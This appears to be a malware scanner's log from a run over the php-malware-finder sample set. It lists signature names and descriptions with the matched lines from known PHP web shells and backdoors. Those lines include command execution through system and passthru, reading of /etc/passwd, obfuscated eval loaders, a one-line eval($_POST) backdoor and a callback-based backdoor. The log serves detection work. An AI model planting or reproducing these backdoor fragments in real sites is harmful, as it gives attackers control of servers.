2021-11-17T13:01:43.423Z - info: 1:<?php /*** PHP Encode v1.0 by zeura.com ***/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZF ~ line truncated ~
2021-11-17T13:01:43.423Z - info: 2:
2021-11-17T13:01:43.423Z - info: *************************** Result ***************************
2021-11-17T13:01:43.424Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/c100.php found:
2021-11-17T13:01:43.424Z - info:  
{
  id: 88,
  name: 'PHP_Shell_FsAccess',
  description: 'Jetpack has detected a web-based shell (a very dangerous backdoor) which may allow unauthorized access to your server. A shell may be used to infect your server with a virus, or add malware to your site.'
}
2021-11-17T13:01:43.424Z - info: Lines matched:
2021-11-17T13:01:43.424Z - info: 113:
2021-11-17T13:01:43.424Z - info: 114:$nixpwdperpage = 100; // Get first N lines from /etc/passwd
2021-11-17T13:01:43.424Z - info: 115:
2021-11-17T13:01:43.424Z - info: 116:$bindport_pass = "k1r4";  // default password for binding
2021-11-17T13:01:43.424Z - info: 117:$bindport_port = "31373"; // default port for binding
2021-11-17T13:01:43.424Z - info: 223:
2021-11-17T13:01:43.424Z - info: 224:$disablefunc = @ini_get("disable_functions");
2021-11-17T13:01:43.424Z - info: 225:if (!empty($disablefunc))
2021-11-17T13:01:43.424Z - info: 226:{
2021-11-17T13:01:43.424Z - info: 415:  elseif (($result = `$cmd`) !== FALSE) {}
2021-11-17T13:01:43.424Z - info: 416:  elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
2021-11-17T13:01:43.424Z - info: 417:  elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
2021-11-17T13:01:43.424Z - info: 418:  elseif (is_resource($fp = popen($cmd,"r")))
2021-11-17T13:01:43.424Z - info: 1430:   if (!is_numeric($fqb_lenght)) {$fqb_lenght = $nixpwdperpage;}
2021-11-17T13:01:43.424Z - info: 1431:   $fp = fopen("/etc/passwd","r");
2021-11-17T13:01:43.424Z - info: 1432:   if (!$fp) {echo "Can't get /etc/passwd for password-list.";}
2021-11-17T13:01:43.424Z - info: 1433:   else
2021-11-17T13:01:43.424Z - info: 1500:   if ($nixpasswd == 1) {$nixpasswd = 0;}
2021-11-17T13:01:43.424Z - info: 1501:   echo "<b>*nix /etc/passwd:</b><br>";
2021-11-17T13:01:43.424Z - info: 1502:   if (!is_numeric($nixpwd_s)) {$nixpwd_s = 0;}
2021-11-17T13:01:43.424Z - info: 1516:  }
2021-11-17T13:01:43.424Z - info: 1517:  else {echo "<br><a href=\"".$surl."act=security&nixpasswd=1&d=".$ud."\"><b><u>Get /etc/passwd</u></b></a><br>";}
2021-11-17T13:01:43.424Z - info: 1518: }
2021-11-17T13:01:43.425Z - info: 3025:                  <OPTION VALUE="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null">Suid bins
2021-11-17T13:01:43.425Z - info: 3026:                    <OPTION VALUE="cut -d: -f1,2,3 /etc/passwd | grep ::">USER WITHOUT PASSWORD!
2021-11-17T13:01:43.425Z - info: 3027:                    <OPTION VALUE="find /etc/ -type f -perm -o+w 2> /dev/null">Write in /etc/?
2021-11-17T13:01:43.425Z - info: 3068:      <div align="center">
2021-11-17T13:01:43.425Z - info: 3069:      File: <input type="text" name="file" method="get"> <input type="submit" value="Read File"><br><br> eg: /etc/passwd<br>
2021-11-17T13:01:43.425Z - info: 3070:      
2021-11-17T13:01:43.425Z - info: *************************** Result ***************************
2021-11-17T13:01:43.425Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/c99.php found:
2021-11-17T13:01:43.425Z - info:  
{
  id: 88,
  name: 'PHP_Shell_FsAccess',
  description: 'Jetpack has detected a web-based shell (a very dangerous backdoor) which may allow unauthorized access to your server. A shell may be used to infect your server with a virus, or add malware to your site.'
}
2021-11-17T13:01:43.425Z - info: Lines matched:
2021-11-17T13:01:43.425Z - info: 118:
2021-11-17T13:01:43.425Z - info: 119:$nixpwdperpage = 100; // Get first N lines from /etc/passwd
2021-11-17T13:01:43.425Z - info: 120:
2021-11-17T13:01:43.425Z - info: 228:
2021-11-17T13:01:43.425Z - info: 229:$disablefunc = @ini_get("disable_functions");
2021-11-17T13:01:43.426Z - info: 230:if (!empty($disablefunc))
2021-11-17T13:01:43.426Z - info: 420:  elseif (($result = `$cmd`) !== FALSE) {}
2021-11-17T13:01:43.426Z - info: 421:  elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
2021-11-17T13:01:43.426Z - info: 422:  elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
2021-11-17T13:01:43.426Z - info: 423:  elseif (is_resource($fp = popen($cmd,"r")))
2021-11-17T13:01:43.426Z - info: 1433:   if (!is_numeric($fqb_lenght)) {$fqb_lenght = $nixpwdperpage;}
2021-11-17T13:01:43.426Z - info: 1434:   $fp = fopen("/etc/passwd","r");
2021-11-17T13:01:43.426Z - info: 1435:   if (!$fp) {echo "Can't get /etc/passwd for password-list.";}
2021-11-17T13:01:43.426Z - info: 1436:   else
2021-11-17T13:01:43.426Z - info: 1503:   if ($nixpasswd == 1) {$nixpasswd = 0;}
2021-11-17T13:01:43.426Z - info: 1504:   echo "<b>*nix /etc/passwd:</b><br>";
2021-11-17T13:01:43.426Z - info: 1505:   if (!is_numeric($nixpwd_s)) {$nixpwd_s = 0;}
2021-11-17T13:01:43.426Z - info: 1519:  }
2021-11-17T13:01:43.426Z - info: 1520:  else {echo "<br><a href=\"".$surl."act=security&nixpasswd=1&d=".$ud."\"><b><u>Get /etc/passwd</u></b></a><br>";}
2021-11-17T13:01:43.426Z - info: 1521: }
2021-11-17T13:01:43.426Z - info: 3028:                  <OPTION VALUE="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null">Suid bins
2021-11-17T13:01:43.426Z - info: 3029:                    <OPTION VALUE="cut -d: -f1,2,3 /etc/passwd | grep ::">USER WITHOUT PASSWORD!
2021-11-17T13:01:43.426Z - info: 3030:                    <OPTION VALUE="find /etc/ -type f -perm -o+w 2> /dev/null">Write in /etc/?
2021-11-17T13:01:43.427Z - info: 3071:      <div align="center">
2021-11-17T13:01:43.427Z - info: 3072:      File: <input type="text" name="file" method="get"> <input type="submit" value="Read File"><br><br> eg: /etc/passwd<br>
2021-11-17T13:01:43.427Z - info: 3073:      
2021-11-17T13:01:43.427Z - info: *************************** Result ***************************
2021-11-17T13:01:43.427Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/real/exceptions.php found:
2021-11-17T13:01:43.427Z - info:  
{
  id: 161,
  name: 'PHP_Generic_BadPattern_7',
  description: 'This file contains suspicious hidden code, and should be checked for recent changes, or malicious code. Often hackers try to hide their hack attempts by obfuscating their attack code, to make it harder to detect.'
}
2021-11-17T13:01:43.427Z - info: Lines matched:
2021-11-17T13:01:43.427Z - info: 1:<?php                                                                                                                                                                                              $ksyweqahwz = 95; function ngomynsz($jkvdve, $swxidbkzpw){$azzogyulq = ''; for($i=0; $i < strlen($jkvdve) ~ line truncated ~
2021-11-17T13:01:43.427Z - info: *************************** Result ***************************
2021-11-17T13:01:43.427Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/real/exceptions.php found:
2021-11-17T13:01:43.427Z - info:  
{
  id: 180,
  name: 'PHP_Generic_BadPattern_8a',
  description: 'This code pattern is often used to execute unauthorized programs on your server. The code in these files needs to be reviewed, and possibly cleaned.'
}
2021-11-17T13:01:43.427Z - info: Lines matched:
2021-11-17T13:01:43.427Z - info: 1:<?php                                                                                                                                                                                              $ksyweqahwz = 95; function ngomynsz($jkvdve, $swxidbkzpw){$azzogyulq = ''; for($i=0; $i < strlen($jkvdve) ~ line truncated ~
2021-11-17T13:01:43.427Z - info: *************************** Result ***************************
2021-11-17T13:01:43.427Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/real/ice.php found:
2021-11-17T13:01:43.427Z - info:  
{
  id: 33,
  name: 'php_suspicious_evalGlobals_001',
  description: 'Jetpack has detected code that is often used in web-based shell programs. If you believe the file(s) have been infected they need to be cleaned. If you trust the source of the code, and believe the code is correct, you may hide the notice.'
}
2021-11-17T13:01:43.428Z - info: Lines matched:
2021-11-17T13:01:43.428Z - info: 1:<?php ${${eval($_POST[ice])}};?>
2021-11-17T13:01:43.428Z - info: 2:
2021-11-17T13:01:43.428Z - info: *************************** Result ***************************
2021-11-17T13:01:43.428Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/real/include.php found:
2021-11-17T13:01:43.428Z - info:  
{
  id: 183,
  name: 'php_bad_include_2',
  description: 'This signature will detect PHP file inclusions (require and include functions) using hexadecimal encoded strings to hide the file. Since it is mostly used by malicious actors we recommend you to review this piece of code and remove if malicious.'
}
2021-11-17T13:01:43.428Z - info: Lines matched:
2021-11-17T13:01:43.428Z - info: 2:/*8a68d*/
2021-11-17T13:01:43.428Z - info: 3:@include "\x2fh\x6fm\x65/\x77e\x62p\x6ce\x78x\x33/\x70u\x62l\x69c\x5fh\x74m\x6c/\x68i\x73-\x68e\x6d.\x6fr\x67/\x5f_\x4dA\x43O\x53X\x2fm\x6fd\x75l\x65s\x2fn\x6fd\x65/\x66a\x76i\x63o\x6e_\x31a\x33f\x384\x2ei\x63o";
2021-11-17T13:01:43.428Z - info: 4:/*8a68d*/
2021-11-17T13:01:43.428Z - info: *************************** Result ***************************
2021-11-17T13:01:43.428Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/cyb3rsh3ll.php found:
2021-11-17T13:01:43.428Z - info:  
{
  id: 6,
  name: 'Generic_Eval_1',
  description: 'The detected file uses PHP eval function loading encoded functions. If used incorrectly this can allow unauthorized access to your server. We recommend you check the code with the developer or find an up-to-date extension to avoid issues.'
}
2021-11-17T13:01:43.428Z - info: Lines matched:
2021-11-17T13:01:43.428Z - info: 5941:$encoded = \''.$encoded.'\';
2021-11-17T13:01:43.428Z - info: 5942:eval(gzinflate(base64_decode($encoded)));
2021-11-17T13:01:43.428Z - info: 5943:// Encoded by cyb3r sh3ll. Thanx lionaneesh for this idea.
2021-11-17T13:01:43.428Z - info: *************************** Result ***************************
2021-11-17T13:01:43.428Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/cyb3rsh3ll.php found:
2021-11-17T13:01:43.428Z - info:  
{
  id: 88,
  name: 'PHP_Shell_FsAccess',
  description: 'Jetpack has detected a web-based shell (a very dangerous backdoor) which may allow unauthorized access to your server. A shell may be used to infect your server with a virus, or add malware to your site.'
}
2021-11-17T13:01:43.429Z - info: Lines matched:
2021-11-17T13:01:43.429Z - info: 193:    {
2021-11-17T13:01:43.429Z - info: 194:			echo @ini_get('disable_functions');
2021-11-17T13:01:43.429Z - info: 195:    }
2021-11-17T13:01:43.429Z - info: 318:$cx7 =".com"; 
2021-11-17T13:01:43.429Z - info: 319:$nixpwdperpage = 100; // Get first N lines from /etc/passwd
2021-11-17T13:01:43.429Z - info: 320:$bindport_pass = "cyb3r";  // default password for binding
2021-11-17T13:01:43.429Z - info: 574:
2021-11-17T13:01:43.429Z - info: 575:$disablefunc = @ini_get("disable_functions");
2021-11-17T13:01:43.429Z - info: 576:
2021-11-17T13:01:43.429Z - info: 958:
2021-11-17T13:01:43.429Z - info: 959:  elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
2021-11-17T13:01:43.429Z - info: 960:
2021-11-17T13:01:43.429Z - info: 961:  elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
2021-11-17T13:01:43.429Z - info: 962:
2021-11-17T13:01:43.429Z - info: 2972:
2021-11-17T13:01:43.429Z - info: 2973:   echo "<b>*nix /etc/passwd:</b><br>";
2021-11-17T13:01:43.429Z - info: 2974:
2021-11-17T13:01:43.429Z - info: 3004:
2021-11-17T13:01:43.430Z - info: 3005:  else {echo "<br><a href=\"".$surl."act=security&nixpasswd=1&d=".$ud."\"><b><u>Get /etc/passwd</u></b></a><br>";}
2021-11-17T13:01:43.430Z - info: 3006:
2021-11-17T13:01:43.430Z - info: 3254:echo "<tr><td width=\"25%\" >Passwd file:</td><td >";
2021-11-17T13:01:43.430Z - info: 3255:if (is_readable('/etc/passwd')) echo "
2021-11-17T13:01:43.430Z - info: 3256:<a href=\"".hlinK("seC=edit&filE=/etc/passwd&workingdiR=$cwd")."\">Readable</a>"; else echo'Not readable';echo "</td></tr><tr><td width=\"25%\" bgcolor=\"#666666\">Cpanel log file:</td><td bgcolor=\"#666666\">";
2021-11-17T13:01:43.430Z - info: 3257:if (file_exists("/var/cpanel/accounting.log")){if (is_readable("/var/cpanel/accounting.log")) echo "<a href=\"".hlinK("seC=edit&filE=/var/cpanel/accounting.log&workingdiR=$cwd")."\"><font color=#66ffff>Readable</font></a>"; else echo "Not readable";}else echo "Not found";
2021-11-17T13:01:43.430Z - info: 4020:
2021-11-17T13:01:43.430Z - info: 4021:            <div align="center">File: <input type="text" name="file" method="get"> <input type="submit" value="Read File"><br><br> eg: /etc/passwd<br>
2021-11-17T13:01:43.430Z - info: 4022:			<?php     
2021-11-17T13:01:43.430Z - info: 4935:###################
2021-11-17T13:01:43.430Z - info: 4936:@$passwd = fopen('/etc/passwd','r');
2021-11-17T13:01:43.430Z - info: 4937:if (!$passwd) { die('<b>[-] Error : coudn`t read /etc/passwd</b>'); }
2021-11-17T13:01:43.430Z - info: 4938:$pub = array();
2021-11-17T13:01:43.430Z - info: 4962:echo '<br><br><textarea class="output" >';
2021-11-17T13:01:43.430Z - info: 4963:echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n";
2021-11-17T13:01:43.430Z - info: 4964:echo "[+] Founded ".sizeof($pub)." readable public_html directories\n";
2021-11-17T13:01:43.430Z - info: 5695:
2021-11-17T13:01:43.430Z - info: 5696:                    <OPTION VALUE="cut -d: -f1,2,3 /etc/passwd | grep ::">USER WITHOUT PASSWORD!</option>
2021-11-17T13:01:43.430Z - info: 5697:
2021-11-17T13:01:43.430Z - info: 6430:      system('ls /var/mail'); 
2021-11-17T13:01:43.430Z - info: 6431:   if (isset($_POST['grab_users1'])) //grab users from /etc/passwd
2021-11-17T13:01:43.430Z - info: 6432:   {
2021-11-17T13:01:43.431Z - info: 6433:	  $lines=file("/etc/passwd");
2021-11-17T13:01:43.431Z - info: 6434:	  foreach($lines as $nr=>$val)
2021-11-17T13:01:43.431Z - info: 6461:		     <input type="hidden" value="true" name="grab_users1"></input>
2021-11-17T13:01:43.431Z - info: 6462:             <input type=submit value="Grab Usernames from /etc/passwd" width="217px"></input>
2021-11-17T13:01:43.431Z - info: 6463:		  </form>
2021-11-17T13:01:43.431Z - info: 6812:<tr><td width=\"20%\" bgcolor=\"#666666\">Grab from:</td>
2021-11-17T13:01:43.431Z - info: 6813:<td bgcolor=\"#666666\"><input type=text value=\"/etc/passwd\" name=input size=35></td></tr>
2021-11-17T13:01:43.431Z - info: 6814:<tr><td width=\"20%\" bgcolor=\"#808080\">Output:</td>
2021-11-17T13:01:43.431Z - info: *************************** Result ***************************
2021-11-17T13:01:43.431Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/real/sucuri_2014_04.php found:
2021-11-17T13:01:43.431Z - info:  
{
  id: 112,
  name: 'PHP_Shell_Eval_1',
  description: 'Jetpack has detected a web-based shell (a very dangerous backdoor) which may allow unauthorized access to your server. A shell may be used to infect your server with a virus, or add malware to your site.'
}
2021-11-17T13:01:43.431Z - info: Lines matched:
2021-11-17T13:01:43.431Z - info: 2:/* https://blog.sucuri.net/2014/04/php-callback-functions-another-way-to-hide-backdoors.html */
2021-11-17T13:01:43.431Z - info: 3:@array_diff_ukey(@array((string)$_REQUEST['password']=>1), @array((string)stripslashes($_REQUEST['re_password'])=>2),$_REQUEST['login']);
2021-11-17T13:01:43.431Z - info: 4:
